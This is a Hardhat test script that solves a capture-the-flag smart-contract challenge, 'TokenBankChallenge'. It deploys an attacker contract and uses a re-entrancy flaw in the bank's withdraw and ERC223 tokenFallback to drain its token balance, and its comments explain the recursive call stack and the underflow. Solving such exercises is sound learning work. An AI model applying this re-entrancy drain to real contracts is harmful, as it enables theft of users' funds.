import { ethers } from "hardhat";
import { Contract, Signer } from "ethers";
import { expect } from "chai";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challengeContract: Contract;
let tx: any;

const ATTACKER_INITIAL_BALANCE = ethers.utils.parseEther(`500000`);

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(
    "TokenBankChallenge"
  );
  challengeContract = challengeFactory.attach(
    // `0xa649bBE9F268fB18008179e8759EA396BB56f90A` old
    `0x304cD4253Ff3E2fdE72a5cae1418b2C04c3236b4`
  );
});

it("solves the challenge", async function () {
  // The attack should be initiated from a contract(attacker) to be able
  // to exploit the vulnerability in withdraw function from TokenBankChallenge
  // Because there is a re-entrancy issue when doing the withdraw
  // withdraw => token.transfer => msg.sender.tokenFallback() => ...
  // Balance in TokenBankChallenge is only updated after finishing tokenFallback 
  // in which we can make it to call withdraw function recursively until all 
  // balance is drained from TokenBank contract within the context of tokenFallback
  const attackerFactory = await ethers.getContractFactory("TokenBankAttacker");
  attacker = await attackerFactory.deploy(challengeContract.address);
  const tokenAddress = await challengeContract.token();
  const tokenFactory = await ethers.getContractFactory("SimpleERC223Token");
  const token = await tokenFactory.attach(tokenAddress);

  await eoa.provider!.waitForTransaction(attacker.deployTransaction.hash);

  // need to move tokens from eoa to contract for contract to use funds
  // challenge => EOA
  tx = await challengeContract.withdraw(ATTACKER_INITIAL_BALANCE);
  await tx.wait();

  // EOA => attacker
  tx = await token[`transfer(address,uint256)`](
    attacker.address,
    ATTACKER_INITIAL_BALANCE
  );
  await tx.wait();

  // attacker => challenge
  tx = await attacker.deposit();
  await tx.wait();

  const attackerBalance = await challengeContract.balanceOf(attacker.address);
  console.log(`attackerBalance`, attackerBalance.toString());
  expect(attackerBalance).to.eq(ATTACKER_INITIAL_BALANCE);

  tx = await attacker.attack();
  
  /* function call stack
      attack()
      callWithdraw() // down : InitialBalance = 50000
      challenge.withdraw(50000) // up : balanceOf[attacker] => 0 - 50000 => underflows
      tokenFallback()
      callWithdraw() // down : InitialBalance = 50000 
      challenge.withdraw(50000) // up : balanceOf[attacker] => 50000 - 50000 => 0
      tokenFallback()
      callWithdraw() // down : remainingBalance = 0, bubble up!
   */
  await tx.wait();

  const isComplete = await challengeContract.isComplete();
  expect(isComplete).to.be.true;
});
